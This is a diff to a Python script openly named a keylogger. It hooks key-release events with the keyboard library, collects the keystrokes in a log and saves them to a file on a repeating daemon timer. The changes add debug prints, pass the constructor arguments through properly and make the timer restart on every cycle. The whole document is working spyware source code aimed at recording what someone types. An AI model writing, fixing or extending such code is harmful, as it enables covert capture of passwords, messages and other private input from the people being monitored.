@@ -6,10 +6,11 @@ from datetime import datetime
 send_report = 20 
 
 class keylogger :
-    def __init__(self, interval ,report_method = 'text_file') :
+    def __init__(self, interval ,report_method = "file") :
 
-        self.interval = 20  #the time intervals
-        self.report_method = "file" # the report sending medium
+        print("here")
+        self.interval = interval  #the time intervals
+        self.report_method = report_method # the report sending medium
 
         self.log = "" #the actual logs to report i.e, the key reports
 
@@ -22,6 +23,7 @@ class keylogger :
         (i.e when a key is released in this example)
         """
         name = event.name
+        print("here2")
 
         if len(name) > 1 :
 
@@ -67,9 +69,11 @@ class keylogger :
             this function get called for every self.interval 
             it basically saves keylogs and resets 'self.log' variable
         """
-
+        print('in the report')
+        print(f"length of log is : {len(self.log)}")
         if self.log :
             # if there is something to report, do it mann !!!
+            print("somthing to log")
             
             self.end_date = datetime.now()
 
@@ -89,16 +93,16 @@ class keylogger :
 
             self.start_date = datetime.now()
 
-            self.log = ""
+        self.log = ""
 
-            timer = Timer(interval = self.interval, function= self.report)
+        timer = Timer(interval = self.interval, function= self.report)
 
             #setting the thread as daemon (dies when the main thread dies)
 
-            timer.daemon = True
+        timer.daemon = True
 
-            # start the thimer
-            timer.start()
+            # start the timer
+        timer.start()
         
     def start(self) :
 
@@ -106,10 +110,12 @@ class keylogger :
         self.start_date = datetime.now()
 
         #startng the keylogger
+
         keyboard.on_release(callback=self.callback)
 
         #start reporting the keylogger
         self.report()
+        print("after report")
 
         print("started the keylogger")
 
@@ -119,9 +125,8 @@ class keylogger :
 
 if __name__=="__main__" :
 
-    keylogger= keylogger(interval=send_report, report_method="file")
-    keylogger.start()
-
+    keylog= keylogger(interval=send_report, report_method="file")
+    keylog.start()
 
 
 
